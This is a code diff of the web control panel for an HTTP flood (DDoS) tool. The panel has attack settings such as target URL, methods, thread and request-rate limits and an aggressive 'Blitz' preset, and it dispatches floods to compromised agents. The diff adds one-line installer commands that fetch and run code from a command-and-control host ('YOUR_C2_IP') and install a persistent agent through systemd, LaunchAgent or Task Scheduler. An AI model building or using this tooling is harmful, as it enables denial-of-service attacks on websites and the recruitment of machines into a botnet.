@@ -55,11 +55,11 @@
                         <div class="card-header">Attack Configuration</div>
                         <form class="form" onsubmit="startFlood(event)">
                             <div class="field">
-                                <label>Target URL</label>
+                                <label>Target URL <span class="tip" data-tip="Full URL to flood including protocol. Example: https://example.com">?</span></label>
                                 <input type="text" id="target" placeholder="https://example.com" required>
                             </div>
                             <div class="field">
-                                <label>Attack Vector</label>
+                                <label>Attack Vector <span class="tip" data-tip="HTTP method to use. MULTI cycles through all methods in parallel for maximum coverage.">?</span></label>
                                 <select id="attack-type">
                                     <option value="GET">GET Flood</option>
                                     <option value="POST">POST Flood</option>
@@ -73,20 +73,20 @@
                             </div>
                             <div class="field-row">
                                 <div class="field">
-                                    <label>Connections</label>
+                                    <label>Connections <span class="tip" data-tip="Number of parallel threads sending requests simultaneously. Higher = more concurrent load.">?</span></label>
                                     <input type="number" id="workers" value="50" min="1" max="1000">
                                 </div>
                                 <div class="field">
-                                    <label>Target RPS</label>
+                                    <label>Target RPS <span class="tip" data-tip="Max requests per second to attempt. Actual RPS may be lower depending on target latency and network.">?</span></label>
                                     <input type="number" id="rps" value="100" min="1" max="50000">
                                 </div>
                                 <div class="field">
-                                    <label>Duration (s)</label>
+                                    <label>Duration (s) <span class="tip" data-tip="How long to run the flood in seconds. Use Stop Flood to terminate early.">?</span></label>
                                     <input type="number" id="duration" value="30" min="1" max="3600">
                                 </div>
                             </div>
                             <div class="field">
-                                <label>Presets</label>
+                                <label>Presets <span class="tip" data-tip="Quick-fill for connections / RPS / duration. Blitz = maximum aggression (150 workers, 500 RPS, 30s).">?</span></label>
                                 <div class="preset-row">
                                     <button type="button" class="preset" onclick="applyPreset(25,50,30)">Light</button>
                                     <button type="button" class="preset" onclick="applyPreset(50,100,60)">Medium</button>
@@ -95,17 +95,29 @@
                                 </div>
                             </div>
                             <div class="field">
-                                <label>Launch Mode</label>
+                                <label>Launch Mode <span class="tip" data-tip="This server sends traffic via the Squid proxy. Agents send traffic directly from their own IP. Both can run simultaneously.">?</span></label>
                                 <div class="toggle-row">
                                     <label class="toggle-label">
                                         <input type="checkbox" id="opt-local" checked>
                                         <span class="toggle-text">This server (via proxy)</span>
                                     </label>
                                     <label class="toggle-label">
-                                        <input type="checkbox" id="opt-bots" checked>
-                                        <span class="toggle-text">All connected agents</span>
-                                        <span class="badge" id="agent-count-badge" style="margin-left:6px">0</span>
+                                        <input type="checkbox" id="opt-bots">
+                                        <span class="toggle-text">Selected agents</span>
                                     </label>
+                                </div>
+                            </div>
+                            <div class="field" id="agent-selector-field" style="display:none">
+                                <div class="agent-select-hdr">
+                                    <label>Agents <span class="tip" data-tip="Select which connected devices to dispatch the flood task to. Each agent runs the flood independently from its own IP.">?</span></label>
+                                    <div style="display:flex;gap:10px">
+                                        <button type="button" class="btn-link" onclick="selectAllAgents(true)">All</button>
+                                        <button type="button" class="btn-link" onclick="selectAllAgents(false)">None</button>
+                                        <span class="badge" id="agent-count-badge">0</span>
+                                    </div>
+                                </div>
+                                <div class="agent-select-box" id="agent-select-box">
+                                    <div class="agent-select-empty">No agents connected</div>
                                 </div>
                             </div>
                             <button type="submit" class="btn btn-primary btn-full" id="start-btn">Launch Flood</button>
@@ -119,13 +131,13 @@
                             <span class="live-tag" id="live-tag" style="display:none">LIVE</span>
                         </div>
                         <div class="stat-grid">
-                            <div class="stat"><div class="stat-val" id="stat-rps">0</div><div class="stat-lbl">Req/s</div></div>
-                            <div class="stat"><div class="stat-val" id="stat-total">0</div><div class="stat-lbl">Total</div></div>
-                            <div class="stat"><div class="stat-val green" id="stat-success">0</div><div class="stat-lbl">Success</div></div>
-                            <div class="stat"><div class="stat-val red" id="stat-errors">0</div><div class="stat-lbl">Errors</div></div>
-                            <div class="stat"><div class="stat-val" id="stat-elapsed">0s</div><div class="stat-lbl">Elapsed</div></div>
-                            <div class="stat"><div class="stat-val" id="stat-p50">-</div><div class="stat-lbl">p50 ms</div></div>
-                            <div class="stat"><div class="stat-val" id="stat-p99">-</div><div class="stat-lbl">p99 ms</div></div>
+                            <div class="stat"><div class="stat-val" id="stat-rps">0</div><div class="stat-lbl">Req/s <span class="tip" data-tip="Live requests per second — calculated over the last tick interval (0.5s window).">?</span></div></div>
+                            <div class="stat"><div class="stat-val" id="stat-total">0</div><div class="stat-lbl">Total <span class="tip" data-tip="Total requests sent since the flood started, including retries and errors.">?</span></div></div>
+                            <div class="stat"><div class="stat-val green" id="stat-success">0</div><div class="stat-lbl">Success <span class="tip" data-tip="Requests that received any HTTP response (2xx, 3xx, 4xx, 5xx). Connection errors are excluded.">?</span></div></div>
+                            <div class="stat"><div class="stat-val red" id="stat-errors">0</div><div class="stat-lbl">Errors <span class="tip" data-tip="Requests that failed with a connection error, timeout, or proxy error.">?</span></div></div>
+                            <div class="stat"><div class="stat-val" id="stat-elapsed">0s</div><div class="stat-lbl">Elapsed <span class="tip" data-tip="Time elapsed since the flood started. Flood stops automatically after the configured duration.">?</span></div></div>
+                            <div class="stat"><div class="stat-val" id="stat-p50">-</div><div class="stat-lbl">p50 ms <span class="tip" data-tip="50th percentile latency — half of all requests completed faster than this value.">?</span></div></div>
+                            <div class="stat"><div class="stat-val" id="stat-p99">-</div><div class="stat-lbl">p99 ms <span class="tip" data-tip="99th percentile latency — the slowest 1% of requests took longer than this. High p99 = target under stress.">?</span></div></div>
                         </div>
                         <div class="progress-row" id="progress-row" style="display:none">
                             <div class="progress-bg"><div class="progress-fill" id="progress-fill"></div></div>
@@ -192,26 +204,17 @@
                                 </div>
                             </div>
 
-                            <!-- Linux / macOS -->
+                            <!-- Universal JS installer — works on all platforms -->
                             <div style="background:#0f172a;border-radius:8px;padding:14px 16px">
                                 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-                                    <span style="font-size:.73rem;color:#64748b;text-transform:uppercase;letter-spacing:.05em">Linux / macOS — paste in terminal</span>
-                                    <button class="btn-link" onclick="copyInstaller('sh')">Copy</button>
+                                    <span style="font-size:.73rem;color:#64748b;text-transform:uppercase;letter-spacing:.05em">All platforms (Linux, macOS, Windows) — requires Node.js</span>
+                                    <button class="btn-link" onclick="copyInstaller('js')">Copy</button>
                                 </div>
-                                <pre id="install-sh" class="code-block" style="margin:0;background:transparent;padding:0;color:#4ade80">curl -s "http://YOUR_C2_IP:5000/install.sh?host=YOUR_C2_IP&amp;port=5000" | bash</pre>
-                            </div>
-
-                            <!-- Windows -->
-                            <div style="background:#0f172a;border-radius:8px;padding:14px 16px">
-                                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-                                    <span style="font-size:.73rem;color:#64748b;text-transform:uppercase;letter-spacing:.05em">Windows — paste in PowerShell</span>
-                                    <button class="btn-link" onclick="copyInstaller('ps1')">Copy</button>
-                                </div>
-                                <pre id="install-ps1" class="code-block" style="margin:0;background:transparent;padding:0;color:#60a5fa">iwr "http://YOUR_C2_IP:5000/install.ps1?host=YOUR_C2_IP&port=5000" | iex</pre>
+                                <pre id="install-js" class="code-block" style="margin:0;background:transparent;padding:0;color:#a78bfa">node -e "$(curl -s 'http://YOUR_C2_IP:5000/install.js?host=YOUR_C2_IP&port=5000')"</pre>
                             </div>
 
                             <div style="font-size:.78rem;color:#64748b;padding:2px 0">
-                                The agent installs to <code style="background:#f1f5f9;padding:1px 5px;border-radius:3px">~/.l7agent/</code>, starts immediately, and persists across reboots via systemd / cron / Task Scheduler.
+                                The installer auto-detects your OS (Linux / macOS / Windows), installs Python if needed, downloads the agent with C2 address baked in, starts it immediately, and sets up persistence (systemd / LaunchAgent / Task Scheduler). Agent installs to <code style="background:#f1f5f9;padding:1px 5px;border-radius:3px">~/.l7agent/</code>.
                             </div>
                         </div>
                     </section>
